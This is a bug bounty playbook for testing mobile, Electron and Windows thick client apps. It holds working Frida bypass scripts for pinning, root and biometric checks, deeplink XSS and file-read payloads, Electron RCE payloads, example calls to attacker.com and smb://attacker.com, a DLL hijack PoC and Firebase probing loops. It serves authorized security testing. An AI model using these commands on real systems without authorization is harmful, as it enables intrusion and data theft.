# Playbook: Mobile & Thick Client Security Testing

## Purpose
Systematically test mobile applications (Android/iOS), Electron/desktop apps,
and Windows thick clients for security vulnerabilities relevant to bug bounty.
Covers static analysis, dynamic instrumentation, traffic interception, and
cloud backend misconfiguration.
Input: APK/IPA file, app package name, desktop application binary, or target app URL.

---

## Step 1 — Android APK Static Analysis

### 1a. Decompilation

```bash
# Decompile APK with apktool (resources + smali)
apktool d target.apk -o target_apktool/

# Decompile to Java source with jadx
jadx target.apk -d target_jadx/

# Alternative: dex2jar + JD-GUI
d2j-dex2jar target.apk -o target.jar
# Open target.jar in JD-GUI or procyon/CFR decompiler

# For split APKs (from device)
adb shell pm path com.target.app
adb pull /data/app/com.target.app-1/base.apk
adb pull /data/app/com.target.app-1/split_config.arm64_v8a.apk
```

### 1b. Hardcoded Secrets

```bash
TARGET_DIR="target_jadx"

# API keys and tokens
grep -rniE "(api[_-]?key|api[_-]?secret|access[_-]?token|auth[_-]?token|bearer)" \
  "$TARGET_DIR" --include="*.java" --include="*.xml" --include="*.json"

# AWS credentials
grep -rniE "(AKIA[0-9A-Z]{16}|aws[_-]?secret|aws[_-]?access)" "$TARGET_DIR"

# Firebase URLs
grep -rniE "https://[a-z0-9-]+\.firebaseio\.com" "$TARGET_DIR"
grep -rniE "https://[a-z0-9-]+\.firebaseapp\.com" "$TARGET_DIR"

# Google API keys
grep -rniE "AIza[0-9A-Za-z_-]{35}" "$TARGET_DIR"

# Private keys and certificates
grep -rniE "(BEGIN (RSA |EC |DSA )?PRIVATE KEY|BEGIN CERTIFICATE)" "$TARGET_DIR"

# Check BuildConfig
cat "$TARGET_DIR"/resources/assets/*.json 2>/dev/null
find "$TARGET_DIR" -name "BuildConfig.java" -exec cat {} \;

# Check strings.xml
find "$TARGET_DIR" -name "strings.xml" -exec grep -iE \
  "(key|secret|token|password|api|endpoint|firebase|aws)" {} \;

# Check res/raw and assets for config files
find "$TARGET_DIR" -path "*/res/raw/*" -o -path "*/assets/*" | head -50
find "$TARGET_DIR" \( -name "*.json" -o -name "*.xml" -o -name "*.properties" \
  -o -name "*.yml" -o -name "*.pem" -o -name "*.p12" \) | head -50
```

### 1c. AndroidManifest.xml Analysis

```bash
# Extract and review manifest
cat target_apktool/AndroidManifest.xml

# Exported components (accessible to other apps)
grep -E 'exported="true"' target_apktool/AndroidManifest.xml

# Activities with intent filters (implicitly exported)
grep -B5 '<intent-filter' target_apktool/AndroidManifest.xml

# Content providers
grep -A5 '<provider' target_apktool/AndroidManifest.xml
# Check: exported="true", grantUriPermissions="true", no permissions

# Broadcast receivers
grep -A5 '<receiver' target_apktool/AndroidManifest.xml

# Deeplinks and custom URL schemes
grep -A3 'android:scheme=' target_apktool/AndroidManifest.xml

# Backup allowed (data extraction risk)
grep 'allowBackup' target_apktool/AndroidManifest.xml

# Debuggable flag
grep 'debuggable' target_apktool/AndroidManifest.xml

# Network security config
grep 'networkSecurityConfig' target_apktool/AndroidManifest.xml
NETSEC=$(grep -oP 'networkSecurityConfig="@xml/\K[^"]+' target_apktool/AndroidManifest.xml)
[ -n "$NETSEC" ] && cat "target_apktool/res/xml/${NETSEC}.xml"
```

---

## Step 2 — Android Dynamic Analysis

### 2a. Intent & Deeplink Abuse

```bash
# List exported activities
adb shell dumpsys package com.target.app | grep -A1 "Activity"

# Launch exported activity directly
adb shell am start -n com.target.app/.InternalActivity

# Trigger deeplink
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://callback?token=attacker_value" com.target.app

# Test content provider queries
adb shell content query --uri content://com.target.app.provider/users
adb shell content query --uri content://com.target.app.provider/../../etc/hosts

# Send broadcast to exported receiver
adb shell am broadcast -a com.target.app.ACTION_DEBUG \
  --es "command" "dump_config"

# Path traversal via content provider
adb shell content read --uri content://com.target.app.provider/../../../../etc/passwd
```

### 2b. WebView Vulnerabilities

```bash
# Search for WebView configuration in decompiled source
grep -rn "setJavaScriptEnabled(true)" "$TARGET_DIR" --include="*.java"
grep -rn "addJavascriptInterface" "$TARGET_DIR" --include="*.java"
grep -rn "setAllowFileAccess\|setAllowFileAccessFromFileURLs\|setAllowUniversalAccessFromFileURLs" \
  "$TARGET_DIR" --include="*.java"
grep -rn "loadUrl\|loadData\|evaluateJavascript" "$TARGET_DIR" --include="*.java"

# Check for WebView universal XSS via deeplink
# If a deeplink parameter is loaded into WebView without validation:
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://webview?url=javascript:alert(document.cookie)" com.target.app

adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://webview?url=https://attacker.com/evil.html" com.target.app

# file:// access in WebView (if AllowFileAccess is true)
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://webview?url=file:///data/data/com.target.app/shared_prefs/config.xml"
```

### 2c. Certificate Pinning Bypass

```bash
# Method 1 — Frida (universal pinner bypass)
frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause

# Popular Frida script for SSL pinning bypass:
cat << 'FRIDAEOF' > ssl_pinning_bypass.js
Java.perform(function() {
    // TrustManager bypass
    var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
    TrustManagerImpl.verifyChain.implementation = function() {
        return arguments[0];
    };

    // OkHttp3 CertificatePinner bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List')
            .implementation = function(hostname, peerCertificates) {
            return;
        };
    } catch(e) {}

    // Retrofit / custom pinning
    try {
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;',
            '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom')
            .implementation = function(km, tm, sr) {
            var TrustManager = Java.use('com.android.org.conscrypt.TrustManagerImpl');
            this.init(km, tm, sr);
        };
    } catch(e) {}
});
FRIDAEOF

# Method 2 — objection (automated)
objection -g com.target.app explore
# Inside objection shell:
# android sslpinning disable

# Method 3 — apk-mitm (repackage APK with pinning removed)
npx apk-mitm target.apk
# Outputs: target-patched.apk (install this instead)

# Method 4 — Magisk + TrustMeAlready / AlwaysTrustUserCerts module
# Install Magisk module to move user CA certs to system store
```

### 2d. Root Detection Bypass

```bash
# Frida script to bypass common root detection
cat << 'FRIDAEOF' > root_bypass.js
Java.perform(function() {
    // Generic file existence check bypass
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var name = this.getAbsolutePath();
        var dominated = ["/system/app/Superuser.apk", "/system/xbin/su",
            "/sbin/su", "/data/local/xbin/su", "/data/local/bin/su",
            "/system/bin/su", "/system/sd/xbin/su",
            "/data/local/su", "/su/bin/su"];
        if (dominated.indexOf(name) >= 0) {
            return false;
        }
        return this.exists();
    };

    // RootBeer bypass
    try {
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        RootBeer.isRooted.implementation = function() { return false; };
        RootBeer.isRootedWithoutBusyBoxCheck.implementation = function() { return false; };
    } catch(e) {}

    // SafetyNet bypass — use Magisk + MagiskHide/Shamiko instead
});
FRIDAEOF

frida -U -f com.target.app -l root_bypass.js --no-pause

# objection automated bypass
objection -g com.target.app explore
# android root disable
```

---

## Step 3 — iOS Application Analysis

### 3a. IPA Extraction and Decryption

```bash
# Method 1 — frida-ios-dump (requires jailbroken device)
# Install: pip3 install frida-tools
python3 dump.py com.target.app   # from frida-ios-dump repo

# Method 2 — CrackerXI+ (Cydia app on jailbroken device)
# Tap the app in CrackerXI+ to get decrypted IPA

# Method 3 — bagbak
bagbak -o output/ com.target.app

# Unzip IPA for analysis
unzip -o target.ipa -d target_ipa/
# Binary is at: target_ipa/Payload/Target.app/Target
```

### 3b. Plist and Keychain Analysis

```bash
# Info.plist analysis
plutil -p target_ipa/Payload/Target.app/Info.plist

# Check URL schemes
plutil -p target_ipa/Payload/Target.app/Info.plist | grep -A5 "CFBundleURLSchemes"

# Check ATS exceptions (App Transport Security)
plutil -p target_ipa/Payload/Target.app/Info.plist | grep -A20 "NSAppTransportSecurity"
# Bad signs:
#   NSAllowsArbitraryLoads = true    (all HTTP allowed)
#   NSExceptionAllowsInsecureHTTPLoads = true  (specific domain)
#   NSExceptionMinimumTLSVersion = "TLSv1.0"

# Find embedded plist files
find target_ipa/ -name "*.plist" -exec echo "=== {} ===" \; -exec plutil -p {} \;

# Keychain dump (on jailbroken device via objection)
objection -g com.target.app explore
# ios keychain dump
# ios keychain dump --json

# Keychain dump via Frida
frida -U -f com.target.app -l keychain_dump.js

# Check for sensitive data in NSUserDefaults
objection -g com.target.app explore
# ios nsuserdefaults get
```

### 3c. Binary Analysis

```bash
# Check binary protections
otool -l target_ipa/Payload/Target.app/Target | grep -A2 "LC_ENCRYPTION_INFO"
# cryptid 0 = decrypted, cryptid 1 = encrypted

# Check PIE (Position Independent Executable)
otool -hv target_ipa/Payload/Target.app/Target | grep PIE

# Check for stack canary
otool -Iv target_ipa/Payload/Target.app/Target | grep __stack_chk

# Check ARC (Automatic Reference Counting)
otool -Iv target_ipa/Payload/Target.app/Target | grep objc_release

# Extract strings
strings target_ipa/Payload/Target.app/Target | grep -iE \
  "(http|https|api|key|secret|token|password|firebase|aws)" | sort -u
```

### 3d. URL Scheme Hijacking

```bash
# List registered URL schemes
plutil -p target_ipa/Payload/Target.app/Info.plist | grep -B2 -A5 "CFBundleURLSchemes"

# Test URL scheme handling (on device)
# If app registers targetapp:// and passes data to WebView or backend:
# Create a malicious app or HTML page that triggers:
# <a href="targetapp://callback?code=ATTACKER_AUTH_CODE">Click</a>
# <iframe src="targetapp://deeplink?redirect=https://attacker.com">

# Check if scheme handler validates the source
# This is exploitable if another app can register the same scheme
# and intercept OAuth callbacks or auth tokens

# objection — monitor URL scheme handling
objection -g com.target.app explore
# ios hooking watch class *URLScheme*
# ios hooking watch method "-[AppDelegate application:openURL:options:]"
```

---

## Step 4 — API Traffic Interception

### 4a. Proxy Setup

```bash
# Android proxy setup (Burp Suite on port 8080)
adb shell settings put global http_proxy "HOST_IP:8080"

# Install Burp CA cert on Android
# Export cert from Burp: Proxy > Options > Import/Export CA > DER format
openssl x509 -inform DER -in burp.der -out burp.pem
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1)
cp burp.pem "${HASH}.0"

# Push to device (requires root or Magisk module)
adb push "${HASH}.0" /sdcard/
adb shell su -c "mount -o rw,remount /system"
adb shell su -c "cp /sdcard/${HASH}.0 /system/etc/security/cacerts/"
adb shell su -c "chmod 644 /system/etc/security/cacerts/${HASH}.0"

# For Android 14+ use Magisk module: AlwaysTrustUserCerts

# iOS proxy setup
# Settings > Wi-Fi > HTTP Proxy > Manual > HOST_IP:8080
# Visit http://burp to download CA cert
# Settings > General > VPN & Device Management > Install
# Settings > General > About > Certificate Trust Settings > Enable

# Remove proxy when done
adb shell settings put global http_proxy :0
```

### 4b. Traffic Analysis for Hidden Endpoints

```bash
# With proxy running, exercise the app thoroughly, then:

# Export Burp sitemap or use mitmproxy
mitmproxy --mode regular --listen-port 8080 -w traffic.flow

# Analyze captured traffic
mitmdump -r traffic.flow --set flow_detail=2 | \
  grep -oP 'https?://[^\s"]+' | sort -u > api_endpoints.txt

# Look for hidden/debug endpoints
grep -iE "(debug|admin|internal|staging|dev|test|beta|v2|graphql)" api_endpoints.txt

# Check for API versioning (v1 exists, try v2/v3)
grep -oP '/api/v\d+' api_endpoints.txt | sort -u

# Look for sensitive data in responses
mitmdump -r traffic.flow --set flow_detail=2 | \
  grep -iE "(password|token|secret|ssn|credit.card|cvv)" | head -50

# Check for missing auth on API endpoints
# Replay requests without auth headers
while read endpoint; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "$endpoint")
  [ "$code" != "401" ] && [ "$code" != "403" ] && \
    echo "[NO AUTH] $endpoint -> $code"
done < api_endpoints.txt
```

---

## Step 5 — Firebase & Cloud Backend Misconfiguration

### 5a. Open Firebase Databases

```bash
# Extract Firebase URL from app
FIREBASE_URL="https://target-app.firebaseio.com"

# Test unauthenticated read
curl -sk "${FIREBASE_URL}/.json"
# If returns data -> CRITICAL: open Firebase database

# Test unauthenticated write
curl -sk -X PUT "${FIREBASE_URL}/test_write.json" \
  -d '{"test": "bugbounty_write_test"}'
# If succeeds -> CRITICAL: writable Firebase database

# Clean up test write
curl -sk -X DELETE "${FIREBASE_URL}/test_write.json"

# Enumerate common paths
for path in users accounts config settings admin debug logs; do
  result=$(curl -sk "${FIREBASE_URL}/${path}.json")
  if [ "$result" != "null" ] && [ -n "$result" ]; then
    echo "[DATA] /${path} -> $(echo "$result" | head -c 200)"
  fi
done

# Check Firestore REST API
PROJECT_ID="target-project"
curl -sk "https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/"

# Enumerate Firestore collections
for collection in users accounts settings config profiles orders; do
  result=$(curl -sk "https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${collection}")
  echo "$result" | grep -q "documents" && echo "[DATA] /${collection} has documents"
done
```

### 5b. Cloud Messaging Token Abuse

```bash
# Extract FCM server key from decompiled app
grep -rniE "AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}" "$TARGET_DIR"

# If server key is found, test sending push notifications
FCM_KEY="AAAA...extracted_key..."
curl -sk -X POST "https://fcm.googleapis.com/fcm/send" \
  -H "Authorization: key=${FCM_KEY}" \
  -H "Content-Type: application/json" \
  -d '{
    "to": "/topics/all",
    "notification": {
      "title": "Security Test",
      "body": "FCM key exposed - bug bounty PoC"
    }
  }'
# If 200 OK -> server key is valid and exploitable

# Check Firebase Storage rules
BUCKET="target-app.appspot.com"
curl -sk "https://firebasestorage.googleapis.com/v0/b/${BUCKET}/o" | head -100
```

---

## Step 6 — Electron / Desktop Application Testing

### 6a. ASAR Extraction and Source Review

```bash
# Find and extract asar archive
# macOS
ASAR_PATH="/Applications/Target.app/Contents/Resources/app.asar"
# Windows
# ASAR_PATH="C:\Users\%USERNAME%\AppData\Local\Target\resources\app.asar"
# Linux
# ASAR_PATH="/opt/Target/resources/app.asar"

npx asar extract "$ASAR_PATH" app_extracted/

# Review package.json for dependencies and entry point
cat app_extracted/package.json

# Search for secrets in extracted source
grep -rniE "(api[_-]?key|secret|token|password|firebase|aws)" app_extracted/ \
  --include="*.js" --include="*.json" --include="*.ts"

# Search for dangerous Electron configurations
grep -rn "nodeIntegration" app_extracted/ --include="*.js"
grep -rn "contextIsolation" app_extracted/ --include="*.js"
grep -rn "enableRemoteModule" app_extracted/ --include="*.js"
grep -rn "webSecurity" app_extracted/ --include="*.js"
grep -rn "allowRunningInsecureContent" app_extracted/ --include="*.js"
```

### 6b. nodeIntegration Vulnerabilities

```bash
# If nodeIntegration: true and contextIsolation: false -> RCE via XSS
# Any XSS in the renderer process gives full Node.js access

# PoC: if you find XSS in an Electron app with nodeIntegration:
# <img src=x onerror="require('child_process').exec('calc.exe')">
# <img src=x onerror="require('child_process').exec('id > /tmp/rce_poc.txt')">

# Check BrowserWindow creation options
grep -rn "new BrowserWindow" app_extracted/ --include="*.js" -A20

# Look for:
#   webPreferences: {
#     nodeIntegration: true,      // BAD: allows require() in renderer
#     contextIsolation: false,    // BAD: no isolation between contexts
#     enableRemoteModule: true,   // BAD: remote module access
#     webSecurity: false,         // BAD: disables SOP
#   }
```

### 6c. Preload Script Abuse

```bash
# Find preload scripts
grep -rn "preload" app_extracted/ --include="*.js" | grep -v node_modules

# Review preload script for exposed APIs
# If preload exposes dangerous functions via contextBridge:
grep -rn "contextBridge.exposeInMainWorld" app_extracted/ --include="*.js" -A10

# Check if preload leaks Node.js primitives
grep -rn "require\|process\|__dirname\|Buffer" app_extracted/preload*.js 2>/dev/null

# If contextIsolation is true but preload exposes exec/spawn:
# contextBridge.exposeInMainWorld('api', {
#   runCommand: (cmd) => require('child_process').exec(cmd)  // RCE!
# })
```

### 6d. Protocol Handler and file:// Exploitation

```bash
# Check for custom protocol handlers
grep -rn "protocol.register" app_extracted/ --include="*.js"
grep -rn "protocol.handle" app_extracted/ --include="*.js"

# Check if file:// protocol is accessible
# If webSecurity: false, renderer can load local files:
# fetch('file:///etc/passwd').then(r => r.text()).then(console.log)

# Check for navigation restrictions
grep -rn "will-navigate\|new-window\|setWindowOpenHandler" \
  app_extracted/ --include="*.js"

# If no navigation restrictions, renderer can navigate to:
# file:///etc/passwd (read local files)
# javascript:... (execute JS in context)

# Check for shell.openExternal abuse
grep -rn "shell.openExternal" app_extracted/ --include="*.js" -B5 -A5
# If user input flows into shell.openExternal without validation:
# shell.openExternal('file:///etc/passwd')
# shell.openExternal('smb://attacker.com/share')  # credential theft
```

### 6e. Context Isolation Bypass

```bash
# Even with contextIsolation: true, check for prototype pollution paths
# If app uses Object.assign or spread operators with user input
grep -rn "Object.assign\|\.\.\.req\.\|\.\.\.data" app_extracted/ --include="*.js"

# Check Electron version for known CVEs
grep -rn "electron" app_extracted/package.json
# Cross-reference with: https://www.electronjs.org/releases/stable
# Known bypass CVEs: CVE-2020-15174, CVE-2020-4076, CVE-2022-29247

# Check for IPC message handlers that lack validation
grep -rn "ipcMain.handle\|ipcMain.on" app_extracted/ --include="*.js" -A10
# If handlers execute commands or access filesystem based on renderer input -> RCE
```

---

## Step 7 — Windows Thick Client Testing

### 7a. DLL Hijacking

```bash
# Use Process Monitor (procmon) to find missing DLLs
# Filter: Process Name = target.exe, Result = NAME NOT FOUND, Path ends with .dll

# Common DLL hijack locations (check load order):
# 1. Application directory
# 2. Current directory
# 3. System directories (System32, SysWOW64)
# 4. PATH directories

# Generate a PoC DLL (on attacker machine with MinGW)
cat << 'DLLEOF' > hijack.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // PoC: write file to prove execution
        HANDLE hFile = CreateFileA("C:\\temp\\dll_hijack_poc.txt",
            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        char msg[] = "DLL Hijack PoC executed";
        WriteFile(hFile, msg, sizeof(msg), NULL, NULL);
        CloseHandle(hFile);
    }
    return TRUE;
}
DLLEOF

x86_64-w64-mingw32-gcc -shared -o missing_library.dll hijack.c

# Place DLL in application directory and restart the app
# If dll_hijack_poc.txt is created -> DLL hijacking confirmed
```

### 7b. Named Pipe Sniffing

```bash
# List named pipes on Windows (PowerShell)
# [System.IO.Directory]::GetFiles("\\.\\pipe\\")
# Get-ChildItem \\.\pipe\ | Where-Object { $_.Name -match "target" }

# Use PipeList from Sysinternals
# pipelist.exe | findstr /i "target"

# Sniff named pipe traffic with IO Ninja or WinDbg
# Check if pipes have weak ACLs (accessible to low-priv users)
# Use accesschk from Sysinternals:
# accesschk.exe -accepteula \pipe\target_pipe

# Test pipe impersonation
# If a high-priv service reads from a pipe that low-priv users can write to:
# -> potential privilege escalation via impersonation
```

### 7c. Local Storage and Registry Secrets

```bash
# Check application data directories
# %APPDATA%\Target\
# %LOCALAPPDATA%\Target\
# %ProgramData%\Target\

# Search for credentials in config files
# findstr /si "password token secret key api" "C:\Program Files\Target\*"
# findstr /si "password token secret key api" "%APPDATA%\Target\*"

# Check registry for stored credentials
# reg query "HKCU\Software\Target" /s
# reg query "HKLM\Software\Target" /s

# Check for SQLite databases with credentials
# find . -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3"
# sqlite3 found.db ".tables" && sqlite3 found.db "SELECT * FROM credentials;"

# Check for unencrypted local storage
# Look in: %APPDATA%\Target\Local Storage\
# Electron apps: %APPDATA%\Target\Local Storage\leveldb\

# Check for DPAPI-encrypted blobs (can be decrypted by same user)
# mimikatz: dpapi::blob /in:encrypted_blob
```

---

## Step 8 — Automated Scanning with MobSF

```bash
# Run MobSF (Mobile Security Framework) locally
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf

# Upload APK/IPA via web interface at http://localhost:8000
# MobSF performs:
#   - Manifest analysis
#   - Code analysis (hardcoded secrets, insecure functions)
#   - Binary analysis (protections, libraries)
#   - Network security analysis
#   - Permission analysis
#   - Certificate analysis

# API-based scanning (for automation)
# Upload
curl -sk -F "file=@target.apk" "http://localhost:8000/api/v1/upload" \
  -H "Authorization: YOUR_MOBSF_API_KEY"

# Scan
curl -sk -X POST "http://localhost:8000/api/v1/scan" \
  -H "Authorization: YOUR_MOBSF_API_KEY" \
  -d "scan_type=apk&file_name=target.apk&hash=FILE_HASH"

# Get report
curl -sk -X POST "http://localhost:8000/api/v1/report_json" \
  -H "Authorization: YOUR_MOBSF_API_KEY" \
  -d "hash=FILE_HASH" -o mobsf_report.json
```

---

## Step 9 — Frida Dynamic Instrumentation Recipes

```bash
# Install Frida
pip3 install frida-tools

# Push frida-server to Android device
adb push frida-server-16.x.x-android-arm64 /data/local/tmp/frida-server
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "/data/local/tmp/frida-server &"

# List running apps
frida-ps -U

# Hook a specific method
frida -U -f com.target.app -l hook.js --no-pause

# Useful Frida scripts:

# Bypass biometric authentication
cat << 'FRIDAEOF' > bio_bypass.js
Java.perform(function() {
    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
    BiometricPrompt.authenticate.overload(
        'androidx.biometric.BiometricPrompt$PromptInfo'
    ).implementation = function(info) {
        // Trigger success callback directly
        this.mAuthenticationCallback.value.onAuthenticationSucceeded(null);
    };
});
FRIDAEOF

# Dump all shared preferences
cat << 'FRIDAEOF' > dump_prefs.js
Java.perform(function() {
    var context = Java.use('android.app.ActivityThread')
        .currentApplication().getApplicationContext();
    var prefs_dir = context.getFilesDir().getParent() + "/shared_prefs/";
    var files = Java.use('java.io.File').$new(prefs_dir).listFiles();
    for (var i = 0; i < files.length; i++) {
        console.log("=== " + files[i].getName() + " ===");
        var reader = Java.use('java.io.BufferedReader')
            .$new(Java.use('java.io.FileReader').$new(files[i]));
        var line;
        while ((line = reader.readLine()) !== null) {
            console.log(line);
        }
    }
});
FRIDAEOF

# Trace all HTTP requests
cat << 'FRIDAEOF' > trace_http.js
Java.perform(function() {
    var URL = Java.use('java.net.URL');
    URL.openConnection.overload().implementation = function() {
        console.log("[HTTP] " + this.toString());
        return this.openConnection();
    };
});
FRIDAEOF

frida -U -f com.target.app -l dump_prefs.js --no-pause
```

---

## Step 10 — Reverse Engineering with Ghidra (Basics)

```bash
# Launch Ghidra
ghidraRun

# For Android native libraries (.so files):
# 1. Find native libs in APK
find target_apktool/lib/ -name "*.so" | head -20

# 2. Import .so file into Ghidra project
# 3. Auto-analyze (accept defaults)
# 4. Search for interesting strings: Ghidra > Search > For Strings
#    - API keys, URLs, hardcoded credentials
#    - Encryption key material
# 5. Check exported functions: Symbol Tree > Exports
#    - Look for JNI functions (Java_com_target_*)
#    - Check for crypto implementations

# For iOS binaries:
# 1. Import Mach-O binary into Ghidra
# 2. Look for objc_msgSend references to security-relevant methods
# 3. Check for hardcoded strings in .cstring section

# For Windows thick clients:
# 1. Import .exe / .dll into Ghidra
# 2. Check imports for dangerous functions:
#    - CreateFile, WriteFile (file operations)
#    - RegSetValue, RegQueryValue (registry)
#    - CreateProcess, ShellExecute (command execution)
#    - InternetOpen, HttpSendRequest (network)
# 3. Trace from user input to dangerous function calls
```

---

## Output

```
ASSET         : com.target.app (v3.2.1)
PLATFORM      : Android / iOS / Electron / Windows
─────────────────────────────────────────────────────
FINDING 1     : Hardcoded Firebase URL with open database
TYPE          : Cloud Misconfiguration
EVIDENCE      : strings.xml contains https://target.firebaseio.com
                GET /.json returns full database contents
SEVERITY      : CRITICAL
─────────────────────────────────────────────────────
FINDING 2     : Exported activity allows auth bypass
TYPE          : Intent Abuse
EVIDENCE      : adb shell am start -n com.target.app/.AdminActivity
                Opens admin panel without authentication
SEVERITY      : HIGH
─────────────────────────────────────────────────────
FINDING 3     : WebView loads arbitrary URLs via deeplink
TYPE          : WebView Universal XSS
EVIDENCE      : targetapp://webview?url=javascript:alert(document.cookie)
                Executes JS in app context with access to auth tokens
SEVERITY      : HIGH
─────────────────────────────────────────────────────
FINDING 4     : Electron app has nodeIntegration enabled
TYPE          : Remote Code Execution
EVIDENCE      : BrowserWindow created with nodeIntegration: true
                XSS payload: <img src=x onerror="require('child_process').exec('calc')">
SEVERITY      : CRITICAL
─────────────────────────────────────────────────────
FINDINGS SUMMARY
  [CRITICAL] Open Firebase database — full data exposure
  [CRITICAL] Electron nodeIntegration — XSS to RCE
  [HIGH]     Exported activity — admin panel access
  [HIGH]     WebView deeplink — universal XSS
  [MEDIUM]   Certificate pinning not implemented
  [INFO]     Backup enabled (android:allowBackup="true")
─────────────────────────────────────────────────────
NEXT STEPS
  1. Load 03_reporting/report_writer.md for CRITICAL findings
  2. Test Firebase write access for full impact assessment
  3. Enumerate all exported components for additional IDOR
  4. Check API endpoints discovered via traffic interception
```

---

## Tools Reference

```bash
# Android
pip3 install frida-tools objection
apt install apktool                    # or: brew install apktool
# jadx: https://github.com/skylot/jadx/releases
# dex2jar: https://github.com/pxb1988/dex2jar

# iOS
pip3 install frida-tools objection
# frida-ios-dump: https://github.com/AloneMonkey/frida-ios-dump
# bagbak: npm install -g bagbak

# Electron
npm install -g asar

# Traffic interception
pip3 install mitmproxy
# Burp Suite: https://portswigger.net/burp

# Automated scanning
docker pull opensecurity/mobile-security-framework-mobsf

# Reverse engineering
# Ghidra: https://ghidra-sre.org/
# Cutter (radare2 GUI): https://cutter.re/

# Windows thick client
# Sysinternals Suite: https://learn.microsoft.com/en-us/sysinternals/
# Process Monitor, PipeList, accesschk, strings
# x64dbg: https://x64dbg.com/

# General
# apk-mitm: npx apk-mitm target.apk
# Magisk: https://github.com/topjohnwu/Magisk
```
